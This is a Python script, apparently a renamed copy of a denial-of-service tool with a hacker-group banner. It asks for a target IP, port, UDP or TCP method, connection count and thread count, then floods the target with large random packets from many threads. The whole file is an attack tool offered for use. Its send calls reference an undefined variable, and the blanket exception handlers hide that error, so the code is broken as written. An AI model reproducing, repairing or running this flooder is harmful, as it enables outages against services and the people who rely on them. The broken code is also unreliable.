#!/usr/bin/env python3
#Cie Mau Rename
#add na lang po ako ng Update
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[95m
[ • ]====================[ + ]
[ • ] Author - H4RD0N3      
[ • ] AnonPhCyber Sec
[ • ] only UDP/TCP | METHODS
[ • ]====================[ + ]
""")
ip = str(input("\033[93m[ + ] \033[91mHOST/IP :\033[35m "))
port = int(input("\033[93m[ + ] \033[91mPORT :\033[35m "))
choice = str(input("\033[93m[ + ] \033[91mMETHODS :\033[35m "))
times = int(input("\033[93m[ + ] \033[91mCONNECTIONS :\033[35m "))
threads = int(input("\033[93m[ + ] \033[91mTHREADS :\033[35m "))
def run():
  bytes = random._urandom(65534)
  i = random.choice(("\033[97m[ $ ]","[ ! ]","[ # ]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"\033[91m Connection Timed Out! \033[97m{}:{}".format(ip,port))
    except:
      print("\033[97m[ • ]\033[91m Timed Out")

def run2():
  bytes = random._urandom(102400)
  i = random.choice(("\033[97m[ $ ]","[ ! ]","[ # ]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +"\033[91m Connection Timed Out! \033[97m{}:{}".format(ip,port))
    except:
      s.close()
      print("\033[97m[ • ]\033[91m Timed Out")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
